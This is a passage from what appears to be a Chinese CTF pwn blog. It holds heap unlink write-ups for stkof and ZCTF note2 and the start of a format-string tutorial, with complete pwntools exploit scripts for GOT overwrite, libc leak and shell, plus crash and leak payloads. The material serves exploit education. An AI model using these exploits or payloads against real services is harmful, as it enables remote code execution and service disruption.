fgets(&amp;s, 16, stdin); idx = atol(&amp;s); if ( idx &gt; 0x100000 ) return 0xFFFFFFFFLL; if ( !globals[idx] ) return 0xFFFFFFFFLL; free(globals[idx]); globals[idx] = 0LL; return 0LL 根据索引在globals数组获取地址，再free空间。 IO缓存区问题分析值得注意的是，由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。这里经过测试，会申请两个缓冲区，分别大小为 1024 和 1024。具体如下，可以进行调试查看 初次调用 fgets 时，malloc 会分配缓冲区 1024 大小。 *RAX 0x0*RBX 0x400*RCX 0x7ffff7b03c34 (__fxstat64+20) ◂— cmp rax, -0x1000 /* 'H=' */*RDX 0x88*RDI 0x400*RSI 0x7fffffffd860 ◂— 0x16*R8 0x1*R9 0x0*R10 0x7ffff7fd2700 ◂— 0x7ffff7fd2700*R11 0x246*R12 0xa*R13 0x9 R14 0x0*R15 0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288*RBP 0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288*RSP 0x7fffffffd858 —▸ 0x7ffff7a7a1d5 (_IO_file_doallocate+85) ◂— mov rsi, rax*RIP 0x7ffff7a91130 (malloc) ◂— push rbp─────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────── ► 0x7ffff7a91130 &lt;malloc&gt; push rbp &lt;0x7ffff7dd18e0&gt;...，省略 ► f 0 7ffff7a91130 malloc f 1 7ffff7a7a1d5 _IO_file_doallocate+85 f 2 7ffff7a88594 _IO_doallocbuf+52 f 3 7ffff7a8769c _IO_file_underflow+508 f 4 7ffff7a8860e _IO_default_uflow+14 f 5 7ffff7a7bc6a _IO_getline_info+170 f 6 7ffff7a7bd78 f 7 7ffff7a7ab7d fgets+173 f 8 400d2e f 9 7ffff7a2d830 __libc_start_main+240 分配之后，堆如下 pwndbg&gt; heapTop Chunk: 0xe05410Last Remainder: 00xe05000 PREV_INUSE { prev_size = 0, size = 1041, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0}0xe05410 PREV_INUSE { prev_size = 0, size = 134129, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0} 当分配 16 大小的内存后，堆布局如下 pwndbg&gt; heapTop Chunk: 0xe05430Last Remainder: 00xe05000 PREV_INUSE { prev_size = 0, size = 1041, fd = 0xa3631, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0}0xe05410 FASTBIN { prev_size = 0, size = 33, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x20bd1}0xe05430 PREV_INUSE { prev_size = 0, size = 134097, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0} 当使用 printf 函数，会分配 1024 字节空间，如下 *RAX 0x0*RBX 0x400*RCX 0x7ffff7b03c34 (__fxstat64+20) ◂— cmp rax, -0x1000 /* 'H=' */*RDX 0x88*RDI 0x400*RSI 0x7fffffffd1c0 ◂— 0x16 R8 0x0*R9 0x0*R10 0x0*R11 0x246*R12 0x1*R13 0x7fffffffd827 ◂— 0x31 /* '1' */ R14 0x0*R15 0x400de4 ◂— and eax, 0x2e000a64 /* '%d\\n' */*RBP 0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2284*RSP 0x7fffffffd1b8 —▸ 0x7ffff7a7a1d5 (_IO_file_doallocate+85) ◂— mov rsi, rax*RIP 0x7ffff7a91130 (malloc) ◂— push rbp─────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────── ► 0x7ffff7a91130 &lt;malloc&gt; push rbp &lt;0x7ffff7dd2620&gt;。。。省略► f 0 7ffff7a91130 malloc f 1 7ffff7a7a1d5 _IO_file_doallocate+85 f 2 7ffff7a88594 _IO_doallocbuf+52 f 3 7ffff7a878f8 _IO_file_overflow+456 f 4 7ffff7a8628d _IO_file_xsputn+173 f 5 7ffff7a5ae00 vfprintf+3216 f 6 7ffff7a62899 printf+153 f 7 4009cd f 8 400cb1 f 9 7ffff7a2d830 __libc_start_main+240 堆布局如下 pwndbg&gt; heapTop Chunk: 0xe05840Last Remainder: 00xe05000 PREV_INUSE { prev_size = 0, size = 1041, fd = 0xa3631, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0}0xe05410 FASTBIN { prev_size = 0, size = 33, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x411}0xe05430 PREV_INUSE { prev_size = 0, size = 1041, fd = 0xa4b4f, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0}0xe05840 PREV_INUSE { prev_size = 0, size = 133057, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0} 此后，无论是输入输出都不会再申请缓冲区了。所以我们最好最初的申请一个 chunk 来把这些缓冲区给申请了，方便之后操作。 但是，比较有意思的是，如果我们是 attach 上去的话，第一个缓冲区分配的大小为 4096 大小。 pwndbg&gt; heapTop Chunk: 0x1e9b010Last Remainder: 00x1e9a000 PREV_INUSE { prev_size = 0, size = 4113, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0}0x1e9b010 PREV_INUSE { prev_size = 0, size = 135153, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0} 基本思路根据上面分析，我们在前面先分配一个 chunk 来把缓冲区分配完毕，以免影响之后的操作。 由于程序本身没有 leak，要想执行 system 等函数，我们的首要目的还是先构造 leak，基本思路如下 利用 unlink 修改 global[2] 为 &amp;global[2]-0x18。 利用编辑功能修改 global[0] 为 free@got 地址，同时修改 global[1] 为 puts@got 地址，global[2] 为 atoi@got 地址。 修改 free@got 为 puts@plt 的地址，从而当再次调用 free 函数时，即可直接调用 puts 函数。这样就可以泄漏函数内容。 free global[1]，即泄漏 puts@got 内容，从而知道 system 函数地址以及 libc 中 /bin/sh 地址。 修改 atoi@got 为 system 函数地址，再次调用时，输入 /bin/sh 地址即可。 代码如下： context.terminal = ['gnome-terminal', '-x', 'sh', '-c']if args['DEBUG']: context.log_level = 'debug'context.binary = &quot;./stkof&quot;stkof = ELF('./stkof')if args['REMOTE']: p = remote('127.0.0.1', 7777)else: p = process(&quot;./stkof&quot;)log.info('PID: ' + str(proc.pidof(p)[0]))libc = ELF('./libc.so.6')head = 0x602140def alloc(size): p.sendline('1') p.sendline(str(size)) p.recvuntil('OK\\n')def edit(idx, size, content): p.sendline('2') p.sendline(str(idx)) p.sendline(str(size)) p.send(content) p.recvuntil('OK\\n')def free(idx): p.sendline('3') p.sendline(str(idx))def exp(): # trigger to malloc buffer for io function alloc(0x100) # idx 1 # begin alloc(0x30) # idx 2 # small chunk size in order to trigger unlink alloc(0x80) # idx 3 # a fake chunk at global[2]=head+16 who's size is 0x20 payload = p64(0) #prev_size payload += p64(0x20) #size payload += p64(head + 16 - 0x18) #fd payload += p64(head + 16 - 0x10) #bk payload += p64(0x20) # next chunk's prev_size bypass the check payload = payload.ljust(0x30, 'a') # overwrite global[3]'s chunk's prev_size # make it believe that prev chunk is at global[2] payload += p64(0x30) # make it believe that prev chunk is free payload += p64(0x90) edit(2, len(payload), payload) # unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8 free(3) p.recvuntil('OK\\n') # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got payload = 'a' * 8 + p64(stkof.got['free']) + p64(stkof.got['puts']) + p64( stkof.got['atoi']) edit(2, len(payload), payload) # edit free@got to puts@plt payload = p64(stkof.plt['puts']) edit(0, len(payload), payload) # free global[1] to leak puts addr free(1) puts_addr = p.recvuntil('\\nOK\\n', drop=True).ljust(8, '\\x00') puts_addr = u64(puts_addr) log.success('puts addr: ' + hex(puts_addr)) libc_base = puts_addr - libc.symbols['puts'] binsh_addr = libc_base + next(libc.search('/bin/sh')) system_addr = libc_base + libc.symbols['system'] log.success('libc base: ' + hex(libc_base)) log.success('/bin/sh addr: ' + hex(binsh_addr)) log.success('system addr: ' + hex(system_addr)) # modify atoi@got to system addr payload = p64(system_addr) edit(2, len(payload), payload) p.send(p64(binsh_addr)) p.interactive()if __name__ == &quot;__main__&quot;: exp() 2016 ZCTF note2题目链接 分析程序首先，我们先分析一下程序，可以看出程序的主要功能为 添加 note，size 限制为 0x80，size 会被记录，note 指针会被记录。 展示 note 内容。 编辑 note 内容，其中包括覆盖已有的 note，在已有的 note 后面添加内容。 释放 note。 仔细分析后，可以发现程序有以下几个问题 在添加 note 时，程序会记录 note 对应的大小，该大小会用于控制读取 note 的内容，但是读取的循环变量 i 是无符号变量，所以比较时都会转换为无符号变量，那么当我们输入 size 为 0 时，glibc 根据其规定，会分配 0x20 个字节，但是程序读取的内容却并不受到限制，故而会产生堆溢出。 程序在每次编辑 note 时，都会申请 0xa0 大小的内存，但是在 free 之后并没有设置为 NULL。 第一个问题对应在 ida 中的代码如下 unsigned __int64 __fastcall ReadStr(char *s, __int64 len, char a3){ char v4; // [rsp+Ch] [rbp-34h] char buf; // [rsp+2Fh] [rbp-11h] unsigned __int64 i; // [rsp+30h] [rbp-10h] ssize_t v7; // [rsp+38h] [rbp-8h] v4 = a3; for ( i = 0LL; len - 1 &gt; i; ++i ) { v7 = read(0, &amp;buf, 1uLL); if ( v7 &lt;= 0 ) exit(-1); if ( buf == v4 ) break; s[i] = buf; } s[i] = 0; return i;} 其中 i 是 unsigned 类型，a2 为 int 类型，所以两者在 for 循环相比较的时候，a2-1 的结果 - 1 会被视为 unsigned 类型，此时，即最大的整数。所以说可以读取任意长度的数据，这里也就是后面我们溢出所使用的办法。 基本思路这里我们主要利用发现的第一个问题，主要利用了 fastbin 的机制、unlink 的机制。 下面依次进行讲解。 基本操作首先，我们先把 note 可能的基本操作列举出来。 p = process('./note2')note2 = ELF('./note2')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')context.log_level = 'debug'def newnote(length, content): p.recvuntil('option---&gt;&gt;') p.sendline('1') p.recvuntil('(less than 128)') p.sendline(str(length)) p.recvuntil('content:') p.sendline(content)def shownote(id): p.recvuntil('option---&gt;&gt;') p.sendline('2') p.recvuntil('note:') p.sendline(str(id))def editnote(id, choice, s): p.recvuntil('option---&gt;&gt;') p.sendline('3') p.recvuntil('note:') p.sendline(str(id)) p.recvuntil('2.append]') p.sendline(str(choice)) p.sendline(s)def deletenote(id): p.recvuntil('option---&gt;&gt;') p.sendline('4') p.recvuntil('note:') p.sendline(str(id)) 生成三个note 构造三个 chunk，chunk0、chunk1 和 chunk2 # chunk0: a fake chunkptr = 0x0000000000602120fakefd = ptr - 0x18fakebk = ptr - 0x10content = 'a' * 8 + p64(0x61) + p64(fakefd) + p64(fakebk) + 'b' * 64 + p64(0x60)#content = p64(fakefd) + p64(fakebk)newnote(128, content)# chunk1: a zero size chunk produce overwritenewnote(0, 'a' * 8)# chunk2: a chunk to be overwrited and freednewnote(0x80, 'b' * 16) 其中这三个 chunk 申请时的大小分别为 0x80，0，0x80，chunk1 虽然申请的大小为 0，但是 glibc 的要求 chunk 块至少可以存储 4 个必要的字段 (prev_size,size,fd,bk)，所以会分配 0x20 的空间。同时，由于无符号整数的比较问题，可以为该 note 输入任意长的字符串。 这里需要注意的是，chunk0 中一共构造了两个 chunk chunk ptr[0]，这个是为了 unlink 时修改对应的值。 chunk ptr[0]’s nextchunk，这个是为了使得 unlink 时的第一个检查满足。 // 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ malloc_printerr (&quot;corrupted size vs. prev_size&quot;); \\ 当构造完三个note后，堆的基本构造如下图1所示。 +-----------------+ high addr | ... | +-----------------+ | 'b'*8 | ptr[2]-----------&gt; +-----------------+ | size=0x91 | +-----------------+ | prevsize | +-----------------|------------ | unused | +-----------------+ | 'a'*8 | ptr[1]----------&gt; +-----------------+ chunk 1 | size=0x20 | +-----------------+ | prevsize | +-----------------|------------- | unused | +-----------------+ | prev_size=0x60 |fake ptr[0] chunk's nextchunk-----&gt;+-----------------+ | 64*'a' | +-----------------+ | fakebk | +-----------------+ | fakefd | +-----------------+ | 0x61 | chunk 0 +-----------------+ | 'a *8 | ptr[0]----------&gt; +-----------------+ | size=0x91 | +-----------------+ | prev_size | +-----------------+ low addr 图1 释放 chunk1 - 覆盖 chunk2 - 释放 chunk2对应的代码如下 # edit the chunk1 to overwrite the chunk2deletenote(1)content = 'a' * 16 + p64(0xa0) + p64(0x90)newnote(0, content)# delete note 2 to trigger the unlink# after unlink, ptr[0] = ptr - 0x18deletenote(2) 首先释放 chunk1，由于该 chunk 属于 fastbin，所以下次在申请的时候仍然会申请到该 chunk，同时由于上面所说的类型问题，我们可以读取任意字符，所以就可以覆盖 chunk2，覆盖之后如图 2 所示。 +-----------------+high addr | ... | +-----------------+ | '\\x00'+'b'*7 | ptr[2]-----------&gt; +-----------------+ chunk 2 | size=0x90 | +-----------------+ | 0xa0 | +-----------------|------------ | 'a'*8 | +-----------------+ | 'a'*8 | ptr[1]----------&gt; +-----------------+ chunk 1 | size=0x20 | +-----------------+ | prevsize | +-----------------|------------- | unused | +-----------------+ | prev_size=0x60 |fake ptr[0] chunk's nextchunk-----&gt;+-----------------+ | 64*'a' | +-----------------+ | fakebk | +-----------------+ | fakefd | +-----------------+ | 0x61 | chunk 0 +-----------------+ | 'a *8 | ptr[0]----------&gt; +-----------------+ | size=0x91 | +-----------------+ | prev_size | +-----------------+ low addr 图2 该覆盖主要是为了释放 chunk2 的时候可以后向合并（合并低地址），对 chunk0 中虚拟构造的 chunk 进行 unlink。即将要执行的操作为 unlink(ptr[0])，同时我们所构造的 fakebk 和 fakefd 满足如下约束 if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ unlink 成功执行，会导致 ptr[0] 所存储的地址变为 fakebk，即 ptr-0x18。 获取 system 地址代码如下 # overwrite the chunk0(which is ptr[0]) with got atoiatoi_got = note2.got['atoi']content = 'a' * 0x18 + p64(atoi_got)editnote(0, 1, content)# get the aoti addrshownote(0)sh.recvuntil('is ')atoi_addr = sh.recvuntil('\\n', drop=True)print atoi_addratoi_addr = u64(atoi_addr.ljust(8, '\\x00'))print 'leak atoi addr: ' + hex(atoi_addr)# get system addratoi_offest = libc.symbols['atoi']libcbase = atoi_addr - atoi_offestsystem_offest = libc.symbols['system']system_addr = libcbase + system_offestprint 'leak system addr: ', hex(system_addr) 我们修改 ptr[0] 的内容为 ptr 的地址 - 0x18，所以当我们再次编辑 note0 时，可以覆盖 ptr[0] 的内容。这里我们将其覆盖为 atoi 的地址。 这样的话，如果我们查看 note 0 的内容，其实查看的就是 atoi 的地址。 之后我们根据 libc 中对应的偏移计算出 system 的地址。 # overwrite the atoi got with systemaddrcontent = p64(system_addr)editnote(0, 1, content) 由于此时 ptr[0] 的地址 got 表的地址，所以我们可以直接修改该 note，覆盖为 system 地址。 get shell# get shellsh.recvuntil('option---&gt;&gt;')sh.sendline('/bin/sh')sh.interactive() 此时如果我们再调用 atoi ，其实调用的就是 system 函数，所以就可以拿到 shell 了。 exp #coding=utf-8from pwn import *io = remote('node3.buuoj.cn',26189)#io = process(&quot;./note2&quot;)elf = ELF(&quot;./note2&quot;)libc = ELF(&quot;./libc-2.23-64.so&quot;)#context.log_level = &quot;debug&quot;def new_note(size, content): io.recvuntil(&quot;&gt;&gt;&quot;) io.sendline(&quot;1&quot;) io.recvuntil(&quot;)&quot;) io.sendline(str(size)) io.recvuntil(&quot;:&quot;) io.sendline(content)def show_note(index): io.recvuntil(&quot;&gt;&gt;&quot;) io.sendline(&quot;2&quot;) io.recvuntil(&quot;:&quot;) io.sendline(str(index))def edit_note(index, choice, content): io.recvuntil(&quot;&gt;&gt;&quot;) io.sendline(&quot;3&quot;) io.recvuntil(&quot;:&quot;) io.sendline(str(index)) io.recvuntil(&quot;]&quot;) io.sendline(str(choice)) io.recvuntil(&quot;:&quot;) io.sendline(content)def delete_note(index): io.recvuntil(&quot;&gt;&gt;&quot;) io.sendline(&quot;4&quot;) io.recvuntil(&quot;:&quot;) io.sendline(str(index))io.recvuntil(&quot;:&quot;)io.sendline(&quot;/bin/sh&quot;) #nameio.recvuntil(&quot;:&quot;)io.sendline(&quot;ddd&quot;)ptr_0 = 0x602120fake_fd = ptr_0 - 0x18fake_bk = ptr_0 - 0x10note0_content = &quot;\\x00&quot; * 8 + p64(0xa1) + p64(fake_fd) + p64(fake_bk)new_note(0x80, note0_content) #note0new_note(0x0, &quot;aa&quot;) #note1new_note(0x80, &quot;/bin/sh&quot;) #note2#gdb.attach(io)delete_note(1)note1_content = &quot;\\x00&quot; * 16 + p64(0xa0) + p64(0x90)new_note(0x0, note1_content)delete_note(2) #unlink#gdb.attach(io)# 泄漏libcfree_got = elf.got[&quot;free&quot;]payload = 0x18 * &quot;a&quot; + p64(free_got)#gdb.attach(io)edit_note(0, 1, payload)#gdb.attach(io)show_note(0)io.recvuntil(&quot;is &quot;)free_addr = u64(io.recv(6).ljust(8, &quot;\\x00&quot;))libc_addr = free_addr - libc.symbols[&quot;free&quot;]print(&quot;libc address: &quot; + hex(libc_addr))#get shellsystem_addr = libc_addr + libc.symbols[&quot;system&quot;]one_gadget = libc_addr + 0xf02a4edit_note(0, 1, p64(one_gadget)) #overwrite free got -&gt; system address#io.sendlineafter('option---&gt;&gt;','/bin/sh\\x00')io.interactive()","link":"/2021/02/10/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Linux-Pwn/Unlink/"},{"title":"格式化字符串漏洞","text":"格式化字符串漏洞原理介绍格式化字符串函数介绍格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的 C/C++ 程序都会利用格式化字符串函数来输出信息，调试程序，或者处理字符串。一般来说，格式化字符串在利用的时候主要分为三个部分 格式化字符串函数 格式化字符串 后续参数，可选 格式化字符串函数常见的有格式化字符串函数有 输入 scanf 输出 函数 基本介绍 printf 输出到 stdout fprintf 输出到指定 FILE 流 vprintf 根据参数列表格式化输出到 stdout vfprintf 根据参数列表格式化输出到指定 FILE 流 sprintf 输出到字符串 snprintf 输出指定字节数到字符串 vsprintf 根据参数列表格式化输出到字符串 vsnprintf 根据参数列表格式化输出指定字节到字符串 setproctitle 设置 argv syslog 输出日志 err, verr, warn, vwarn 等 。。。 格式化字符串这里我们了解一下格式化字符串的格式，其基本格式如下 %[parameter][flags][field width][.precision][length]type 每一种 pattern 的含义请具体参考维基百科的格式化字符串 。以下几个 pattern 中的对应选择需要重点关注 这里我们了解一下格式化字符串的格式，其基本格式如下 %[parameter][flags][field width][.precision][length]type 每一种 pattern 的含义请具体参考维基百科的格式化字符串 。以下几个 pattern 中的对应选择需要重点关注 parameter n$，获取格式化字符串中的指定参数 flag field width 输出的最小宽度 precision 输出的最大长度 length，输出的长度 hh，输出一个字节 h，输出一个双字节 type d/i，有符号整数 u，无符号整数 x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。 o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。 s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。 c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。 p， void * 型，输出对应变量的值。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。 n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。 %， ‘%‘字面值，不接受任何 flags, width。 参数就是相应的要输出的变量。 格式化字符串原理在一开始，我们就给出格式化字符串的基本介绍，这里再说一些比较细致的内容。我们上面说，格式化字符串函数是根据格式化字符串函数来进行解析的。那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制。比如说’%s’表明我们会输出一个字符串参数。 我们再继续以上面的为例子进行介绍 对于这样的例子，在进入 printf 函数的之前 (即还没有调用 printf)，栈上的布局由高地址到低地址依次如下 some value3.14123456addr of &quot;red&quot;addr of format string: Color %s... 注：这里我们假设 3.14 上面的值为某个未知的值。 在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况 当前字符不是 %，直接输出到相应标准输出。 当前字符是 %， 继续读取下一个字符 如果没有字符，报错 如果下一个字符是 %, 输出 % 否则根据相应的字符，获取相应的参数，对其进行解析并输出 那么假设，此时我们在编写程序时候，写成了下面的样子 printf(&quot;Color %s, Number %d, Float %4.2f&quot;); 此时我们可以发现我们并没有提供参数，那么程序会如何运行呢？程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为 解析其地址对应的字符串 解析其内容对应的整形值 解析其内容对应的浮点值 对于 2，3 来说倒还无妨，但是对于对于 1 来说，如果提供了一个不可访问地址，比如 0，那么程序就会因此而崩溃。 这基本就是格式化字符串漏洞的基本原理了。 参考阅读 https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2 格式化字符串漏洞利用其实，在上一部分，我们展示了格式化字符串漏洞的两个利用手段 使程序崩溃，因为 %s 对应的参数地址不合法的概率比较大。 查看进程内容，根据 %d，%f 输出了栈上的内容。 下面我们会对于每一方面进行更加详细的解释。 程序崩溃通常来说，利用格式化字符串漏洞使得程序崩溃是最为简单的利用方式，因为我们只需要输入若干个 %s 即可 %s%s%s%s%s%s%s%s%s%s%s%s%s%s 这是因为栈上不可能每个值都对应了合法的地址，所以总是会有某个地址可以使得程序崩溃。这一利用，虽然攻击者本身似乎并不能控制程序，但是这样却可以造成程序不可用。比如说，如果远程服务有一个格式化字符串漏洞，那么我们就可以攻击其可用性，使服务崩溃，进而使得用户不能够访问。 泄漏内存利用格式化字符串漏洞，我们还可以获取我们所想要输出的内容。一般会有如下几种操作 泄露栈内存 获取某个变量的值 获取某个变量对应地址的内存 泄露任意地址内存 利用 GOT 表得到 libc 函数地址，进而获取 libc，进而获取其它 libc 函数地址 盲打，dump 整个程序，获取有用信息。 泄漏栈内存 例如，给定如下程序 #include &lt;stdio.h&gt;int main() { char s[100]; int a = 1, b = 0x22222222, c = -1; scanf(&quot;%s&quot;, s); printf(&quot;%08x.%08x.%08x.%s\\n&quot;, a, b, c, s); printf(s); return 0;} 然后，我们简单编译一下 $ gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.cleakmemory.c: In function ‘main’:leakmemory.c:7:10: warning: format not a string literal and no format arguments [-Wformat-security] printf(s); ^ 可以看出，编译器指出了我们的程序中没有给出格式化字符串的参数的问题。下面，我们来看一下，如何获取对应的栈内存。 根据 C 语言的调用规则，格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数 (64 位会根据其传参的规则进行获取)。这里我们主要介绍 32 位。 获取栈变量数值首先，我们可以利用格式化字符串来获取栈上变量的数值。我们可以试一下，运行结果如下 $ ./leakmemory%08x.%08x.%08x00000001.22222222.ffffffff.%08x.%08x.%08xffad3cf0.000000c2.f7e639db 可以看到，我们确实得到了一些内容。为了更加细致的观察，我们利用 GDB 来调试一下，以便于验证我们的想法，这里删除了一些不必要的信息，我们只关注代码段以及栈。 首先，启动程序，将断点下载 printf 函数处 gdb leakmemorygdb-peda$ b printfBreakpoint 1 at 0x8048330 之后，运行程序 gdb-peda$ rStarting program: /home/oldthree/Desktop/leakmemory 此时，程序等待我们的输入，这时我们输入 %08x.%08x.%08x，然后敲击回车，是程序继续运行，可以看出程序首先断在了第一次调用 printf 函数的位置 [----------------------------------registers-------------------------------]EAX: 0xffffce60 (&quot;%08x.%08x.%08x&quot;)EBX: 0x0 ECX: 0x1 EDX: 0xf7fb687c --&gt; 0x0 ESI: 0xf7fb5000 --&gt; 0x1afdb0 EDI: 0xf7fb5000 --&gt; 0x1afdb0 EBP: 0xffffced8 --&gt; 0x0 ESP: 0xffffce3c --&gt; 0x80484bf (&lt;main+84&gt;: add esp,0x20)EIP: 0xf7e4e030 (&lt;printf&gt;: call 0xf7f22369)EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code---------------------------------] 0xf7e4e02b &lt;fprintf+27&gt;: ret 0xf7e4e02c: xchg ax,ax 0xf7e4e02e: xchg ax,ax=&gt; 0xf7e4e030 &lt;printf&gt;: call 0xf7f22369 0xf7e4e035 &lt;printf+5&gt;: add eax,0x166fcb 0xf7e4e03a &lt;printf+10&gt;: sub esp,0xc 0xf7e4e03d &lt;printf+13&gt;: mov eax,DWORD PTR [eax-0x68] 0xf7e4e043 &lt;printf+19&gt;: lea edx,[esp+0x14]No argument[------------------------------------stack---------------------------------]0000| 0xffffce3c --&gt; 0x80484bf (&lt;main+84&gt;: add esp,0x20)0004| 0xffffce40 --&gt; 0x8048563 (&quot;%08x.%08x.%08x.%s\\n&quot;)0008| 0xffffce44 --&gt; 0x1 0012| 0xffffce48 (&quot;\\&quot;\\&quot;\\&quot;\\&quot;\\377\\377\\377\\377`\\316\\377\\377`\\316\\377\\377&quot;, &lt;incomplete sequence \\302&gt;)0016| 0xffffce4c --&gt; 0xffffffff 0020| 0xffffce50 --&gt; 0xffffce60 (&quot;%08x.%08x.%08x&quot;)0024| 0xffffce54 --&gt; 0xffffce60 (&quot;%08x.%08x.%08x&quot;)0028| 0xffffce58 --&gt; 0xc2 [--------------------------------------------------------------------------] 可以看出，此时此时已经进入了 printf 函数中，栈中第一个变量为返回地址，第二个变量为格式化字符串的地址，第三个变量为 a 的值，第四个变量为 b 的值，第五个变量为 c 的值，第六个变量为我们输入的格式化字符串对应的地址。继续运行程序 gdb-peda$ cContinuing.00000001.22222222.ffffffff.%08x.%08x.%08x 可以看出，程序确实输出了每一个变量对应的数值，并且断在了下一个 printf 处 Breakpoint 1, __printf (format=0xffffcd10 &quot;%08x.%08x.%08x&quot;) at printf.c:2828 in printf.c───────────────────────────────────────────────────────────────[ code:i386 ]──── 0xf7e44667 &lt;fprintf+23&gt; inc DWORD PTR [ebx+0x66c31cc4] 0xf7e4466d nop 0xf7e4466e xchg ax, ax → 0xf7e44670 &lt;printf+0&gt; call 0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt; ↳ 0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov eax, DWORD PTR [esp] 0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret 0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov edx, DWORD PTR [esp] 0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret────────────────────────────────────────────────────────[ stack ]────['0xffffccfc', 'l8']80xffffccfc│+0x00: 0x080484ce → &lt;main+99&gt; add esp, 0x10 ← $esp0xffffcd00│+0x04: 0xffffcd10 → &quot;%08x.%08x.%08x&quot;0xffffcd04│+0x08: 0xffffcd10 → &quot;%08x.%08x.%08x&quot;0xffffcd08│+0x0c: 0x000000c20xffffcd0c│+0x10: 0xf7e8b6bb → &lt;handle_intel+107&gt; add esp, 0x100xffffcd10│+0x14: &quot;%08x.%08x.%08x&quot; ← $eax0xffffcd14│+0x18: &quot;.%08x.%08x&quot;0xffffcd18│+0x1c: &quot;x.%08x&quot; 此时，由于格式化字符串为 %x%x%x，所以，程序 会将栈上的 0xffffcd04 及其之后的数值分别作为第一，第二，第三个参数按照 int 型进行解析，分别输出。继续运行，我们可以得到如下结果去，确实和想象中的一样。 gdb-peda$ cContinuing.ffffce60.000000c2.f7e949db[Inferior 1 (process 13081) exited normally] 当然，我们也可以使用 %p 来获取数据，如下 %p.%p.%p00000001.22222222.ffffffff.%p.%p.%p0xff9cb970.0xc2.0xf7e6b9db 这里需要注意的是，并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的。 需要注意的是，我们上面给出的方法，都是依次获得栈中的每个参数，我们有没有办法直接获取栈中被视为第 n+1 个参数的值呢？肯定是可以的啦。方法如下 %n$x 利用如下的字符串，我们就可以获取到对应的第 n+1 个参数的数值。为什么这里要说是对应第 n+1 个参数呢？这是因为格式化参数里面的 n 指的是该格式化字符串对应的第 n 个输出参数，那相对于输出函数来说，就是第 n+1 个参数了。 这里我们再次以 gdb 调试一下。 gdb leakmemorygdb-peda$ b printfBreakpoint 1 at 0x8048330gdb-peda$ rStarting program: /home/oldthree/Desktop/leakmemory%3$x[----------------------------------registers-----------------------------------]EAX: 0xffffd440 (&quot;%3$x&quot;)EBX: 0x0ECX: 0x1EDX: 0xf7fb687c --&gt; 0x0ESI: 0xf7fb5000 --&gt; 0x1afdb0EDI: 0xf7fb5000 --&gt; 0x1afdb0EBP: 0xffffd4b8 --&gt; 0x0ESP: 0xffffd41c --&gt; 0x80484bf (&lt;main+84&gt;: add esp,0x20)EIP: 0xf7e4e030 (&lt;printf&gt;: call 0xf7f22369)EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0xf7e4e02b &lt;fprintf+27&gt;: ret 0xf7e4e02c: xchg ax,ax 0xf7e4e02e: xchg ax,ax=&gt; 0xf7e4e030 &lt;printf&gt;: call 0xf7f22369 0xf7e4e035 &lt;printf+5&gt;: add eax,0x166fcb 0xf7e4e03a 